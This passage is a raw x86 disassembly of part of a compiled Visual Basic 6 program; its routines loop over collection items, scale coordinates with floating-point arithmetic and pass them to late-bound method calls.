00883D58: jmp 883D7Dh
00883D5A: lea eax, var_40
00883D5D: push eax
00883D5E: lea eax, var_3C
00883D61: push eax
00883D62: lea eax, var_38
00883D65: push eax
00883D66: lea eax, var_34
00883D69: push eax
00883D6A: push 00000004h
00883D6C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00883D71: add esp, 00000014h
00883D74: lea ecx, var_50
00883D77: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00883D7C: ret 
End Sub

Private sub unknown_883DB7
00883DB7: push ebp
00883DB8: mov ebp, esp
00883DBA: sub esp, 00000018h
00883DBD: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00883DC2: mov eax, fs:[00h]
00883DC8: push eax
00883DC9: mov fs:[00000000h], esp
00883DD0: mov eax, 00000298h
00883DD5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883DDA: push ebx
00883DDB: push esi
00883DDC: push edi
00883DDD: mov var_18, esp
00883DE0: mov var_14, 0040DBD8h
00883DE7: mov var_10, 00000000h
00883DEE: mov var_0C, 00000000h
00883DF5: mov eax, [ebp+08h]
00883DF8: mov eax, [eax]
00883DFA: push [ebp+08h]
00883DFD: call [eax+04h]
00883E00: mov var_04, 00000001h
00883E07: mov var_04, 00000002h
00883E0E: push FFFFFFFFh
00883E10: call 00410A60h ; On Error ...
00883E15: mov var_04, 00000003h
00883E1C: mov eax, [ebp+08h]
00883E1F: mov eax, [eax]
00883E21: push [ebp+08h]
00883E24: call [eax+000002FCh]
00883E2A: push eax
00883E2B: lea eax, var_30
00883E2E: push eax
00883E2F: call 00410A84h ; Set (object)
00883E34: mov var_00000100, eax
00883E3A: lea eax, var_000000EC
00883E40: push eax
00883E41: mov eax, var_00000100
00883E47: mov eax, [eax]
00883E49: push var_00000100
00883E4F: call [eax+00000080h]
00883E55: fclex 
00883E57: mov var_00000104, eax
00883E5D: cmp var_00000104, 00000000h
00883E64: jnl 883E89h
00883E66: push 00000080h
00883E6B: push 00440EDCh
00883E70: push var_00000100
00883E76: push var_00000104
00883E7C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883E81: mov var_00000158, eax
00883E87: jmp 883E90h
00883E89: and var_00000158, 00000000h
00883E90: fld real4 ptr var_000000EC
00883E96: cmp [008F2000h], 00000000h
00883E9D: jnz 883EA7h
00883E9F: fdiv real4 ptr [00402B64h]
00883EA5: jmp 883EB2h
00883EA7: push [00402B64h]
00883EAD: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
00883EB2: fstsw ax
00883EB4: test al, 0Dh
00883EB6: jnz 00885FC1h
00883EBC: call 00410814h ; msvbvm60.dll.__vbaFpI4
00883EC1: mov var_2C, eax
00883EC4: lea ecx, var_30
00883EC7: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00883ECC: mov var_04, 00000004h
00883ED3: mov eax, [ebp+08h]
00883ED6: mov eax, [eax]
00883ED8: push [ebp+08h]
00883EDB: call [eax+000002FCh]
00883EE1: push eax
00883EE2: lea eax, var_30
00883EE5: push eax
00883EE6: call 00410A84h ; Set (object)
00883EEB: mov var_00000100, eax
00883EF1: lea eax, var_000000EC
00883EF7: push eax
00883EF8: mov eax, var_00000100
00883EFE: mov eax, [eax]
00883F00: push var_00000100
00883F06: call [eax+00000088h]
00883F0C: fclex 
00883F0E: mov var_00000104, eax
00883F14: cmp var_00000104, 00000000h
00883F1B: jnl 883F40h
00883F1D: push 00000088h
00883F22: push 00440EDCh
00883F27: push var_00000100
00883F2D: push var_00000104
00883F33: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883F38: mov var_0000015C, eax
00883F3E: jmp 883F47h
00883F40: and var_0000015C, 00000000h
00883F47: fld real4 ptr var_000000EC
00883F4D: cmp [008F2000h], 00000000h
00883F54: jnz 883F5Eh
00883F56: fdiv real4 ptr [00402B64h]
00883F5C: jmp 883F69h
00883F5E: push [00402B64h]
00883F64: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
00883F69: fstsw ax
00883F6B: test al, 0Dh
00883F6D: jnz 00885FC1h
00883F73: call 00410814h ; msvbvm60.dll.__vbaFpI4
00883F78: mov var_28, eax
00883F7B: lea ecx, var_30
00883F7E: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00883F83: mov var_04, 00000005h
00883F8A: mov eax, [ebp+08h]
00883F8D: mov eax, [eax]
00883F8F: push [ebp+08h]
00883F92: call [eax+0000030Ch]
00883F98: push eax
00883F99: lea eax, var_30
00883F9C: push eax
00883F9D: call 00410A84h ; Set (object)
00883FA2: mov var_00000100, eax
00883FA8: lea eax, var_000000E8
00883FAE: push eax
00883FAF: mov eax, var_00000100
00883FB5: mov eax, [eax]
00883FB7: push var_00000100
00883FBD: call [eax+48h]
00883FC0: fclex 
00883FC2: mov var_00000104, eax
00883FC8: cmp var_00000104, 00000000h
00883FCF: jnl 883FF1h
00883FD1: push 00000048h
00883FD3: push 00440DE8h
00883FD8: push var_00000100
00883FDE: push var_00000104
00883FE4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883FE9: mov var_00000160, eax
00883FEF: jmp 883FF8h
00883FF1: and var_00000160, 00000000h
00883FF8: movsx eax, word ptr var_000000E8
00883FFF: mov var_00000138, eax
00884005: mov var_00000134, 00000001h
0088400F: mov var_24, 00000001h
00884016: lea ecx, var_30
00884019: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0088401E: jmp 884032h
00884020: mov eax, var_24
00884023: add eax, var_00000134
00884029: jo 00885FC6h
0088402F: mov var_24, eax
00884032: mov eax, var_24
00884035: cmp eax, var_00000138
0088403B: jnle 00884796h
00884041: mov var_04, 00000006h
00884048: mov eax, [ebp+08h]
0088404B: mov eax, [eax]
0088404D: push [ebp+08h]
00884050: call [eax+0000030Ch]
00884056: push eax
00884057: lea eax, var_30
0088405A: push eax
0088405B: call 00410A84h ; Set (object)
00884060: mov var_00000100, eax
00884066: lea eax, var_34
00884069: push eax
0088406A: mov ecx, var_24
0088406D: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00884072: push eax
00884073: mov eax, var_00000100
00884079: mov eax, [eax]
0088407B: push var_00000100
00884081: call [eax+40h]
00884084: fclex 
00884086: mov var_00000104, eax
0088408C: cmp var_00000104, 00000000h
00884093: jnl 8840B5h
00884095: push 00000040h
00884097: push 00440DE8h
0088409C: push var_00000100
008840A2: push var_00000104
008840A8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008840AD: mov var_00000164, eax
008840B3: jmp 8840BCh
008840B5: and var_00000164, 00000000h
008840BC: push 00000000h
008840BE: push 68030002h
008840C3: push var_34
008840C6: lea eax, var_54
008840C9: push eax
008840CA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008840CF: add esp, 00000010h
008840D2: push eax
008840D3: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008840D8: xor ecx, ecx
008840DA: test eax, eax
008840DC: setnl cl
008840DF: neg ecx
008840E1: mov var_00000108, cx
008840E8: lea eax, var_34
008840EB: push eax
008840EC: lea eax, var_30
008840EF: push eax
008840F0: push 00000002h
008840F2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008840F7: add esp, 0000000Ch
008840FA: lea ecx, var_54
008840FD: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00884102: movsx eax, word ptr var_00000108
00884109: test eax, eax
0088410B: jz 00884450h
00884111: mov var_04, 00000007h
00884118: mov eax, [ebp+08h]
0088411B: mov eax, [eax]
0088411D: push [ebp+08h]
00884120: call [eax+0000030Ch]
00884126: push eax
00884127: lea eax, var_30
0088412A: push eax
0088412B: call 00410A84h ; Set (object)
00884130: mov var_00000100, eax
00884136: lea eax, var_34
00884139: push eax
0088413A: mov ecx, var_24
0088413D: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00884142: push eax
00884143: mov eax, var_00000100
00884149: mov eax, [eax]
0088414B: push var_00000100
00884151: call [eax+40h]
00884154: fclex 
00884156: mov var_00000104, eax
0088415C: cmp var_00000104, 00000000h
00884163: jnl 884185h
00884165: push 00000040h
00884167: push 00440DE8h
0088416C: push var_00000100
00884172: push var_00000104
00884178: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088417D: mov var_00000168, eax
00884183: jmp 88418Ch
00884185: and var_00000168, 00000000h
0088418C: push 00000000h
0088418E: push 68030003h
00884193: push var_34
00884196: lea eax, var_54
00884199: push eax
0088419A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0088419F: add esp, 00000010h
008841A2: mov eax, [ebp+08h]
008841A5: mov eax, [eax]
008841A7: push [ebp+08h]
008841AA: call [eax+0000030Ch]
008841B0: push eax
008841B1: lea eax, var_38
008841B4: push eax
008841B5: call 00410A84h ; Set (object)
008841BA: mov var_00000108, eax
008841C0: lea eax, var_3C
008841C3: push eax
008841C4: mov ecx, var_24
008841C7: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008841CC: push eax
008841CD: mov eax, var_00000108
008841D3: mov eax, [eax]
008841D5: push var_00000108
008841DB: call [eax+40h]
008841DE: fclex 
008841E0: mov var_0000010C, eax
008841E6: cmp var_0000010C, 00000000h
008841ED: jnl 88420Fh
008841EF: push 00000040h
008841F1: push 00440DE8h
008841F6: push var_00000108
008841FC: push var_0000010C
00884202: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00884207: mov var_0000016C, eax
0088420D: jmp 884216h
0088420F: and var_0000016C, 00000000h
00884216: push 00000000h
00884218: push 68030002h
0088421D: push var_3C
00884220: lea eax, var_64
00884223: push eax
00884224: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00884229: add esp, 00000010h
0088422C: fild dword ptr var_2C
0088422F: fstp real8 ptr var_00000174
00884235: lea eax, var_54
00884238: push eax
00884239: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0088423E: mov ecx, var_2C
00884241: imul ecx, eax
00884244: jo 00885FC6h
0088424A: mov var_00000178, ecx
00884250: fild dword ptr var_00000178
00884256: fstp real8 ptr var_00000180
0088425C: fld real8 ptr var_00000180
00884262: cmp [008F2000h], 00000000h
00884269: jnz 884273h
0088426B: fdiv real8 ptr [0040B998h]
00884271: jmp 884284h
00884273: push [0040B99Ch]
00884279: push [0040B998h]
0088427F: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00884284: fadd real8 ptr var_00000174
0088428A: fstp real4 ptr var_6C
0088428D: fstsw ax
0088428F: test al, 0Dh
00884291: jnz 00885FC1h
00884297: mov var_74, 00000004h
0088429E: fild dword ptr var_28
008842A1: fstp real8 ptr var_00000188
008842A7: lea eax, var_64
008842AA: push eax
008842AB: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008842B0: mov ecx, var_28
008842B3: imul ecx, eax
008842B6: jo 00885FC6h
008842BC: mov var_0000018C, ecx
008842C2: fild dword ptr var_0000018C
008842C8: fstp real8 ptr var_00000194
008842CE: fld real8 ptr var_00000194
008842D4: cmp [008F2000h], 00000000h
008842DB: jnz 8842E5h
008842DD: fdiv real8 ptr [0040DBD0h]
008842E3: jmp 8842F6h
008842E5: push [0040DBD4h]
008842EB: push [0040DBD0h]
008842F1: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
008842F6: fsubr real8 ptr var_00000188
008842FC: fadd real8 ptr [0040DC68h]
00884302: fstp real8 ptr var_0000008C
00884308: fstsw ax
0088430A: test al, 0Dh
0088430C: jnz 00885FC1h
00884312: mov var_00000094, 00000005h
0088431C: mov var_000000AC, 00000004h
00884326: mov var_000000B4, 00000002h
00884330: mov var_000000CC, 00000004h
0088433A: mov var_000000D4, 00000002h
00884344: mov eax, [ebp+08h]
00884347: mov eax, [eax]
00884349: push [ebp+08h]
0088434C: call [eax+0000030Ch]
00884352: push eax
00884353: lea eax, var_40
00884356: push eax
00884357: call 00410A84h ; Set (object)
0088435C: mov var_00000110, eax
00884362: lea eax, var_44
00884365: push eax
00884366: mov ecx, var_24
00884369: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088436E: push eax
0088436F: mov eax, var_00000110
00884375: mov eax, [eax]
00884377: push var_00000110
0088437D: call [eax+40h]
00884380: fclex 
00884382: mov var_00000114, eax
00884388: cmp var_00000114, 00000000h
0088438F: jnl 8843B1h
00884391: push 00000040h
00884393: push 00440DE8h
00884398: push var_00000110
0088439E: push var_00000114
008843A4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008843A9: mov var_00000198, eax
008843AF: jmp 8843B8h
008843B1: and var_00000198, 00000000h
008843B8: push 00000010h
008843BA: pop eax
008843BB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008843C0: lea esi, var_74
008843C3: mov edi, esp
008843C5: movsd 
008843C6: movsd 
008843C7: movsd 
008843C8: movsd 
008843C9: push 00000010h
008843CB: pop eax
008843CC: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008843D1: lea esi, var_00000094
008843D7: mov edi, esp
008843D9: movsd 
008843DA: movsd 
008843DB: movsd 
008843DC: movsd 
008843DD: push 00000010h
008843DF: pop eax
008843E0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008843E5: lea esi, var_000000B4
008843EB: mov edi, esp
008843ED: movsd 
008843EE: movsd 
008843EF: movsd 
008843F0: movsd 
008843F1: push 00000010h
008843F3: pop eax
008843F4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008843F9: lea esi, var_000000D4
008843FF: mov edi, esp
00884401: movsd 
00884402: movsd 
00884403: movsd 
00884404: movsd 
00884405: push 00000004h
00884407: push 80011001h
0088440C: push var_44
0088440F: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00884414: add esp, 0000004Ch
00884417: lea eax, var_44
0088441A: push eax
0088441B: lea eax, var_40
0088441E: push eax
0088441F: lea eax, var_3C
00884422: push eax
00884423: lea eax, var_38
00884426: push eax
00884427: lea eax, var_34
0088442A: push eax
0088442B: lea eax, var_30
0088442E: push eax
0088442F: push 00000006h
00884431: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00884436: add esp, 0000001Ch
00884439: lea eax, var_64
0088443C: push eax
0088443D: lea eax, var_54
00884440: push eax
00884441: push 00000002h
00884443: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00884448: add esp, 0000000Ch
0088444B: jmp 0088478Ah
00884450: mov var_04, 00000009h
00884457: mov eax, [ebp+08h]
0088445A: mov eax, [eax]
0088445C: push [ebp+08h]
0088445F: call [eax+0000030Ch]
00884465: push eax
00884466: lea eax, var_30
00884469: push eax
0088446A: call 00410A84h ; Set (object)
0088446F: mov var_00000100, eax
00884475: lea eax, var_34
00884478: push eax
00884479: mov ecx, var_24
0088447C: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00884481: push eax
00884482: mov eax, var_00000100
00884488: mov eax, [eax]
0088448A: push var_00000100
00884490: call [eax+40h]
00884493: fclex 
00884495: mov var_00000104, eax
0088449B: cmp var_00000104, 00000000h
008844A2: jnl 8844C4h
008844A4: push 00000040h
008844A6: push 00440DE8h
008844AB: push var_00000100
008844B1: push var_00000104
008844B7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008844BC: mov var_0000019C, eax
008844C2: jmp 8844CBh
008844C4: and var_0000019C, 00000000h
008844CB: push 00000000h
008844CD: push 68030003h
008844D2: push var_34
008844D5: lea eax, var_54
008844D8: push eax
008844D9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008844DE: add esp, 00000010h
008844E1: mov eax, [ebp+08h]
008844E4: mov eax, [eax]
008844E6: push [ebp+08h]
008844E9: call [eax+0000030Ch]
008844EF: push eax
008844F0: lea eax, var_38
008844F3: push eax
008844F4: call 00410A84h ; Set (object)
008844F9: mov var_00000108, eax
008844FF: lea eax, var_3C
00884502: push eax
00884503: mov ecx, var_24
00884506: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088450B: push eax
0088450C: mov eax, var_00000108
00884512: mov eax, [eax]
00884514: push var_00000108
0088451A: call [eax+40h]
0088451D: fclex 
0088451F: mov var_0000010C, eax
00884525: cmp var_0000010C, 00000000h
0088452C: jnl 88454Eh
0088452E: push 00000040h
00884530: push 00440DE8h
00884535: push var_00000108
0088453B: push var_0000010C
00884541: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00884546: mov var_000001A0, eax
0088454C: jmp 884555h
0088454E: and var_000001A0, 00000000h
00884555: push 00000000h
00884557: push 68030002h
0088455C: push var_3C
0088455F: lea eax, var_64
00884562: push eax
00884563: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00884568: add esp, 00000010h
0088456B: fild dword ptr var_2C
0088456E: fstp real8 ptr var_000001A8
00884574: lea eax, var_54
00884577: push eax
00884578: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0088457D: mov ecx, var_2C
00884580: imul ecx, eax
00884583: jo 00885FC6h
00884589: mov var_000001AC, ecx
0088458F: fild dword ptr var_000001AC
00884595: fstp real8 ptr var_000001B4
0088459B: fld real8 ptr var_000001B4
008845A1: cmp [008F2000h], 00000000h
008845A8: jnz 8845B2h
008845AA: fdiv real8 ptr [0040B998h]
008845B0: jmp 8845C3h
008845B2: push [0040B99Ch]
008845B8: push [0040B998h]
008845BE: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
008845C3: fadd real8 ptr var_000001A8
008845C9: fstp real4 ptr var_6C
008845CC: fstsw ax
008845CE: test al, 0Dh
008845D0: jnz 00885FC1h
008845D6: mov var_74, 00000004h
008845DD: fild dword ptr var_28
008845E0: fstp real8 ptr var_000001BC
008845E6: lea eax, var_64
008845E9: push eax
008845EA: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008845EF: mov ecx, var_28
008845F2: imul ecx, eax
008845F5: jo 00885FC6h
008845FB: mov var_000001C0, ecx
00884601: fild dword ptr var_000001C0
00884607: fstp real8 ptr var_000001C8
0088460D: fld real8 ptr var_000001C8
00884613: cmp [008F2000h], 00000000h
0088461A: jnz 884624h
0088461C: fdiv real8 ptr [0040DBD0h]
00884622: jmp 884635h
00884624: push [0040DBD4h]
0088462A: push [0040DBD0h]
00884630: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00884635: fsubr real8 ptr var_000001BC
0088463B: fsub real8 ptr [0040DBC8h]
00884641: fstp real8 ptr var_0000008C
00884647: fstsw ax
00884649: test al, 0Dh
0088464B: jnz 00885FC1h
00884651: mov var_00000094, 00000005h
0088465B: mov var_000000AC, 00000004h
00884665: mov var_000000B4, 00000002h
0088466F: mov var_000000CC, 00000004h
00884679: mov var_000000D4, 00000002h
00884683: mov eax, [ebp+08h]
00884686: mov eax, [eax]
00884688: push [ebp+08h]
0088468B: call [eax+0000030Ch]
00884691: push eax
00884692: lea eax, var_40
00884695: push eax
00884696: call 00410A84h ; Set (object)
0088469B: mov var_00000110, eax
008846A1: lea eax, var_44
008846A4: push eax
008846A5: mov ecx, var_24
008846A8: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008846AD: push eax
008846AE: mov eax, var_00000110
008846B4: mov eax, [eax]
008846B6: push var_00000110
008846BC: call [eax+40h]
008846BF: fclex 
008846C1: mov var_00000114, eax
008846C7: cmp var_00000114, 00000000h
008846CE: jnl 8846F0h
008846D0: push 00000040h
008846D2: push 00440DE8h
008846D7: push var_00000110
008846DD: push var_00000114
008846E3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008846E8: mov var_000001CC, eax
008846EE: jmp 8846F7h
008846F0: and var_000001CC, 00000000h
008846F7: push 00000010h
008846F9: pop eax
008846FA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008846FF: lea esi, var_74
00884702: mov edi, esp
00884704: movsd 
00884705: movsd 
00884706: movsd 
00884707: movsd 
00884708: push 00000010h
0088470A: pop eax
0088470B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884710: lea esi, var_00000094
00884716: mov edi, esp
00884718: movsd 
00884719: movsd 
0088471A: movsd 
0088471B: movsd 
0088471C: push 00000010h
0088471E: pop eax
0088471F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884724: lea esi, var_000000B4
0088472A: mov edi, esp
0088472C: movsd 
0088472D: movsd 
0088472E: movsd 
0088472F: movsd 
00884730: push 00000010h
00884732: pop eax
00884733: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884738: lea esi, var_000000D4
0088473E: mov edi, esp
00884740: movsd 
00884741: movsd 
00884742: movsd 
00884743: movsd 
00884744: push 00000004h
00884746: push 80011001h
0088474B: push var_44
0088474E: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00884753: add esp, 0000004Ch
00884756: lea eax, var_44
00884759: push eax
0088475A: lea eax, var_40
0088475D: push eax
0088475E: lea eax, var_3C
00884761: push eax
00884762: lea eax, var_38
00884765: push eax
00884766: lea eax, var_34
00884769: push eax
0088476A: lea eax, var_30
0088476D: push eax
0088476E: push 00000006h
00884770: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00884775: add esp, 0000001Ch
00884778: lea eax, var_64
0088477B: push eax
0088477C: lea eax, var_54
0088477F: push eax
00884780: push 00000002h
00884782: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00884787: add esp, 0000000Ch
0088478A: mov var_04, 0000000Bh
00884791: jmp 00884020h
00884796: mov var_04, 0000000Ch
0088479D: mov eax, [ebp+08h]
008847A0: mov eax, [eax]
008847A2: push [ebp+08h]
008847A5: call [eax+00000308h]
008847AB: push eax
008847AC: lea eax, var_30
008847AF: push eax
008847B0: call 00410A84h ; Set (object)
008847B5: mov var_00000100, eax
008847BB: lea eax, var_000000E8
008847C1: push eax
008847C2: mov eax, var_00000100
008847C8: mov eax, [eax]
008847CA: push var_00000100
008847D0: call [eax+48h]
008847D3: fclex 
008847D5: mov var_00000104, eax
008847DB: cmp var_00000104, 00000000h
008847E2: jnl 884804h
008847E4: push 00000048h
008847E6: push 00440DE8h
008847EB: push var_00000100
008847F1: push var_00000104
008847F7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008847FC: mov var_000001D0, eax
00884802: jmp 88480Bh
00884804: and var_000001D0, 00000000h
0088480B: movsx eax, word ptr var_000000E8
00884812: mov var_00000140, eax
00884818: mov var_0000013C, 00000001h
00884822: mov var_24, 00000001h
00884829: lea ecx, var_30
0088482C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00884831: jmp 884845h
00884833: mov eax, var_24
00884836: add eax, var_0000013C
0088483C: jo 00885FC6h
00884842: mov var_24, eax
00884845: mov eax, var_24
00884848: cmp eax, var_00000140
0088484E: jnle 008856FDh
00884854: mov var_04, 0000000Dh
0088485B: mov eax, [ebp+08h]
0088485E: mov eax, [eax]
00884860: push [ebp+08h]
00884863: call [eax+00000308h]
00884869: push eax
0088486A: lea eax, var_30
0088486D: push eax
0088486E: call 00410A84h ; Set (object)
00884873: mov var_00000100, eax
00884879: lea eax, var_34
0088487C: push eax
0088487D: mov ecx, var_24
00884880: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00884885: push eax
00884886: mov eax, var_00000100
0088488C: mov eax, [eax]
0088488E: push var_00000100
00884894: call [eax+40h]
00884897: fclex 
00884899: mov var_00000104, eax
0088489F: cmp var_00000104, 00000000h
008848A6: jnl 8848C8h
008848A8: push 00000040h
008848AA: push 00440DE8h
008848AF: push var_00000100
008848B5: push var_00000104
008848BB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008848C0: mov var_000001D4, eax
008848C6: jmp 8848CFh
008848C8: and var_000001D4, 00000000h
008848CF: push 00000000h
008848D1: push 68030003h
008848D6: push var_34
008848D9: lea eax, var_54
008848DC: push eax
008848DD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008848E2: add esp, 00000010h
008848E5: push eax
008848E6: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008848EB: xor ecx, ecx
008848ED: test eax, eax
008848EF: setnl cl
008848F2: neg ecx
008848F4: mov var_00000108, cx
008848FB: lea eax, var_34
008848FE: push eax
008848FF: lea eax, var_30
00884902: push eax
00884903: push 00000002h
00884905: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0088490A: add esp, 0000000Ch
0088490D: lea ecx, var_54
00884910: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00884915: movsx eax, word ptr var_00000108
0088491C: test eax, eax
0088491E: jz 00884C63h
00884924: mov var_04, 0000000Eh
0088492B: mov eax, [ebp+08h]
0088492E: mov eax, [eax]
00884930: push [ebp+08h]
00884933: call [eax+00000308h]
00884939: push eax
0088493A: lea eax, var_30
0088493D: push eax
0088493E: call 00410A84h ; Set (object)
00884943: mov var_00000100, eax
00884949: lea eax, var_34
0088494C: push eax
0088494D: mov ecx, var_24
00884950: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00884955: push eax
00884956: mov eax, var_00000100
0088495C: mov eax, [eax]
0088495E: push var_00000100
00884964: call [eax+40h]
00884967: fclex 
00884969: mov var_00000104, eax
0088496F: cmp var_00000104, 00000000h
00884976: jnl 884998h
00884978: push 00000040h
0088497A: push 00440DE8h
0088497F: push var_00000100
00884985: push var_00000104
0088498B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00884990: mov var_000001D8, eax
00884996: jmp 88499Fh
00884998: and var_000001D8, 00000000h
0088499F: push 00000000h
008849A1: push 68030004h
008849A6: push var_34
008849A9: lea eax, var_54
008849AC: push eax
008849AD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008849B2: add esp, 00000010h
008849B5: mov eax, [ebp+08h]
008849B8: mov eax, [eax]
008849BA: push [ebp+08h]
008849BD: call [eax+00000308h]
008849C3: push eax
008849C4: lea eax, var_38
008849C7: push eax
008849C8: call 00410A84h ; Set (object)
008849CD: mov var_00000108, eax
008849D3: lea eax, var_3C
008849D6: push eax
008849D7: mov ecx, var_24
008849DA: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008849DF: push eax
008849E0: mov eax, var_00000108
008849E6: mov eax, [eax]
008849E8: push var_00000108
008849EE: call [eax+40h]
008849F1: fclex 
008849F3: mov var_0000010C, eax
008849F9: cmp var_0000010C, 00000000h
00884A00: jnl 884A22h
00884A02: push 00000040h
00884A04: push 00440DE8h
00884A09: push var_00000108
00884A0F: push var_0000010C
00884A15: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00884A1A: mov var_000001DC, eax
00884A20: jmp 884A29h
00884A22: and var_000001DC, 00000000h
00884A29: push 00000000h
00884A2B: push 68030003h
00884A30: push var_3C
00884A33: lea eax, var_64
00884A36: push eax
00884A37: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00884A3C: add esp, 00000010h
00884A3F: fild dword ptr var_2C
00884A42: fstp real8 ptr var_000001E4
00884A48: lea eax, var_54
00884A4B: push eax
00884A4C: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00884A51: mov ecx, var_2C
00884A54: imul ecx, eax
00884A57: jo 00885FC6h
00884A5D: mov var_000001E8, ecx
00884A63: fild dword ptr var_000001E8
00884A69: fstp real8 ptr var_000001F0
00884A6F: fld real8 ptr var_000001F0
00884A75: cmp [008F2000h], 00000000h
00884A7C: jnz 884A86h
00884A7E: fdiv real8 ptr [0040B998h]
00884A84: jmp 884A97h
00884A86: push [0040B99Ch]
00884A8C: push [0040B998h]
00884A92: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00884A97: fadd real8 ptr var_000001E4
00884A9D: fstp real4 ptr var_6C
00884AA0: fstsw ax
00884AA2: test al, 0Dh
00884AA4: jnz 00885FC1h
00884AAA: mov var_74, 00000004h
00884AB1: fild dword ptr var_28
00884AB4: fstp real8 ptr var_000001F8
00884ABA: lea eax, var_64
00884ABD: push eax
00884ABE: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00884AC3: mov ecx, var_28
00884AC6: imul ecx, eax
00884AC9: jo 00885FC6h
00884ACF: mov var_000001FC, ecx
00884AD5: fild dword ptr var_000001FC
00884ADB: fstp real8 ptr var_00000204
00884AE1: fld real8 ptr var_00000204
00884AE7: cmp [008F2000h], 00000000h
00884AEE: jnz 884AF8h
00884AF0: fdiv real8 ptr [0040DBD0h]
00884AF6: jmp 884B09h
00884AF8: push [0040DBD4h]
00884AFE: push [0040DBD0h]
00884B04: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00884B09: fsubr real8 ptr var_000001F8
00884B0F: fadd real8 ptr [0040DC68h]
00884B15: fstp real8 ptr var_0000008C
00884B1B: fstsw ax
00884B1D: test al, 0Dh
00884B1F: jnz 00885FC1h
00884B25: mov var_00000094, 00000005h
00884B2F: mov var_000000AC, 00000002h
00884B39: mov var_000000B4, 00000002h
00884B43: mov var_000000CC, 00000002h
00884B4D: mov var_000000D4, 00000002h
00884B57: mov eax, [ebp+08h]
00884B5A: mov eax, [eax]
00884B5C: push [ebp+08h]
00884B5F: call [eax+00000308h]
00884B65: push eax
00884B66: lea eax, var_40
00884B69: push eax
00884B6A: call 00410A84h ; Set (object)
00884B6F: mov var_00000110, eax
00884B75: lea eax, var_44
00884B78: push eax
00884B79: mov ecx, var_24
00884B7C: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00884B81: push eax
00884B82: mov eax, var_00000110
00884B88: mov eax, [eax]
00884B8A: push var_00000110
00884B90: call [eax+40h]
00884B93: fclex 
00884B95: mov var_00000114, eax
00884B9B: cmp var_00000114, 00000000h
00884BA2: jnl 884BC4h
00884BA4: push 00000040h
00884BA6: push 00440DE8h
00884BAB: push var_00000110
00884BB1: push var_00000114
00884BB7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00884BBC: mov var_00000208, eax
00884BC2: jmp 884BCBh
